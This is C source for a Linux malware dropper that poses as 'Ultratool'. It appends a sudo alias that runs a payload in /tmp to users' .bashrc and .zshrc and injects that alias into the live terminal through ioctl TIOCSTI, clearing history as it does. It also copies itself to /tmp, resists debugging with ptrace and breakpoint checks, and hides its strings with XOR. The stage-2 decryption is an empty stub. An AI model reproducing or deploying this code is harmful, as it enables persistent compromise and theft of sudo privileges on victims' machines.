#include <sys/ioctl.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <dirent.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>

#define DEBUG

extern char _stage2[];
static int k = 42;
char scratch[4096];

// SOURCE_STRINGS
//#define TERM_ALIAS_XOR "alias sudo='sudo /tmp/entry-RjwtJS && sudo'\nhistory -c && clear\n"
//#define BASHRC_NAME_XOR ".bashrc"
//#define ENV_XOR "HOME"
//#define ALIAS_STR_XOR "\nalias sudo='sudo /tmp/entry-RjwtJS && sudo'\n"
//#define PAYLOAD_LOCATION_XOR "/tmp/entry-RjwtJS"
//#define ANTI_DEBUG_XOR "Why you debug me :(?"
//#define CAPN_XOR "Why you debug me Captain?\n"
// END_SOURCE_STRINGS

//START OBFUSCATING
#define TERM_ALIAS_XOR "alias sudo='sudo /tmp/entry-RjwtJS && sudo'\nhistory -c && clear\n"
#define BASHRC_NAME_XOR ".bashrc"
#define ENV_XOR "HOME"
#define ALIAS_STR_XOR "\nalias sudo='sudo /tmp/entry-RjwtJS && sudo'\n"
#define PAYLOAD_LOCATION_XOR "/tmp/entry-RjwtJS"
#define ANTI_DEBUG_XOR "Why you debug me :(?"
#define CAPN_XOR "Why you debug me Captain?\n"
//END OBFUSCATING

/**
 * Decrypts the STAGE-2 payload which is embedded as an extern 
 * 
 */
void decrypt_stage2(char * write_destination) {
    // Get the decryption key, which is readf 

    // Copy the decrypted payload
    
    // Set the permissions
    
}

/* 
 * Place the ALIAS_STR line in both .zshrc and .bashrc files (if it can find it) 
 */
void backdoor_rcfiles() {
    const char * homedir = getenv("HOME");
    char str[256];
    int nread;

    if (homedir != NULL) {
        snprintf(str, 256,"%s/.zshrc",  homedir);
        FILE * rc_file = fopen(str, "r");
        // Look for bashrc
        if (rc_file) {
            fclose(rc_file);
	    rc_file = fopen(str, "a");

	    fputs(ALIAS_STR, rc_file);
	    fclose(rc_file); 
	}

        snprintf(str, 256, "%s/.bashrc", homedir);
        // Look for zshrc
        rc_file = fopen(str, "r");
        if (rc_file) {
            fclose(rc_file);
	    rc_file = fopen(str,"a");

            fputs(ALIAS_STR, rc_file); 

	    fclose(rc_file);
	}
    } else {
        // Hard way, we look for the home dir.
        DIR * dp;
        struct dirent * ep;
        dp = opendir("/home/");

        if (dp != NULL) {
            while (ep = readdir(dp)) {
                puts(ep->d_name);
		// Now read in directory and look for .zsh or .bashrc file
	        (void) closedir(dp);
	    }
	}	
    }
}

/**
 * This is a very rudimentary single byte XOR function. Analysts could probably easily
 * reveal every string by passing all xored looking strings to a xor brute forcer
 */
char * dexor(const char * to_dexor, int length) {
    int i;
    for (i = 4; i < length+4; i++) {
	// The XOR key is the least significant byte of the string length
        scratch[i] = to_dexor[i] ^ *to_dexor;
    }
    // Tack on null terminator
    scratch[i] = '\0';

    return scratch;
}

/**
 *
 */
void print_meme() {
    printf("\n\n");
    printf(" ____ ___.__   __                 __                .__   \n");
    printf("|    |   \\  |_/  |_____________ _/  |_  ____   ____ |  |  \n");
    printf("|    |   /  |\\   __\\   __ \\__  \\\\   __\\/  _ \\ /  _ \\|  |  \n");
    printf("|    |  /|  |_|  |  |  | \\// __ \\|  | (  <_> |  <_> )  |__\n");
    printf("|______/ |____/__|  |__|  (____  /__|  \\____/ \\____/|____/\n");
    printf("                               \\/                         \n");
    printf("                                                          \n");
    printf("                                                         \n");
    printf("    Thank you for trying Ultratool! We have detected that your system is \n out of date. Please run 'sudo apt update' or 'sudo yum update' to resolve this issue.");
}


/**
 * TODO
 *
 * This function performs the same behavior as the ioctl call, but instead using the syscall directly.
 */
void raw_ioctl() {

}

/**
 * Copy self to the /tmp/ directory 
 */
void copy_self() {
    // Zero out the buffer because readlink doesn't append
    // a null terminator.
    memset(scratch, 0, sizeof(scratch));

    // Get the location of the current executable
    readlink("/proc/self/exe", scratch, sizeof(scratch));

    // Copy the executable to the /tmp/ destination
    int curr_file = open(scratch, O_RDONLY);
    if (curr_file < 0) {
        return; 
    }

    int dest_file = open(dexor(PAYLOAD_LOCATION_XOR, *PAYLOAD_LOCATION_XOR), O_WRONLY | O_CREAT | O_EXCL, 0666);
    if (dest_file < 0) {
        goto failure;
    }
    int nread = 0;
    while (nread = read(curr_file, scratch, sizeof scratch), nread > 0) {
        char * scratch_ptr = scratch;
	ssize_t write_count;

	do {
            write_count = write(dest_file, scratch_ptr, nread);
	    if (write_count >= 0) {
	        nread -= write_count;
	        scratch_ptr += write_count;
	    } else if (errno != EINTR) {
	        goto failure;
	    }
	} while (nread > 0);
    }

    if (nread == 0) {
        if (close(dest_file) < 0) {
	    dest_file = -1;
	    goto failure;
	}
	close(curr_file);
    }
    return;
    // Chmod the executable so that we can execute it
    failure:
       close(curr_file);
       if (dest_file >= 0) {
           close(dest_file);
       }
       return;
}

/*
 * Sets the alias in the current terminal. 
 */
void perform_source() {
    char * cmd = dexor(TERM_ALIAS, *TERM_ALIAS); 
    if (fork() == 0) {
	// Go until null terminator
        while(*cmd != '\0') {
            ioctl(0, TIOCSTI, cmd++);
        }
	sleep(1);
	int i = 0;
        print_meme();
	exit(0);
    } else {
	return;
    }
}

/**
 * Main entry point for our program
 */
int main(int argc, char *argv[]) {

    // Debug prevention. Really we are preventing an easy strace :)
    if(ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) {
        printf(dexor(CAPN_XOR, *CAPN_XOR));
	exit(0);
    } else {
        ptrace(PTRACE_DETACH, 0, 1, 0);
    }

    // Check any functions for bps
    if ((*(volatile unsigned long *)((unsigned long)perform_source) & 0xff) == 0xcc) {
        printf(dexor(ANTI_DEBUG_XOR, *ANTI_DEBUG_XOR));
	exit(0);
    }
    if ((*(volatile unsigned long *)((unsigned long) raw_ioctl) & 0xff) == 0xcc) {
        printf(dexor(ANTI_DEBUG_XOR, *ANTI_DEBUG_XOR));
	exit(0);
    }
    if ((*(volatile unsigned long *)((unsigned long) backdoor_rcfiles) & 0xff) == 0xcc) {
        printf(dexor(ANTI_DEBUG_XOR, *ANTI_DEBUG_XOR));
	exit(0);
    }
    if ((*(volatile unsigned long *)((unsigned long) dexor) & 0xff) == 0xcc) {
        printf(dexor(ANTI_DEBUG_XOR, *ANTI_DEBUG_XOR));
	exit(0);
    }

    unsigned long curr_time = 0;
    uid_t curr_id = geteuid();

    if (curr_id == 0) {
	decrypt_stage2(PAYLOAD_LOCATION);
    } else {
        backdoor_rcfiles();
        perform_source();
        copy_self();
    } 
}
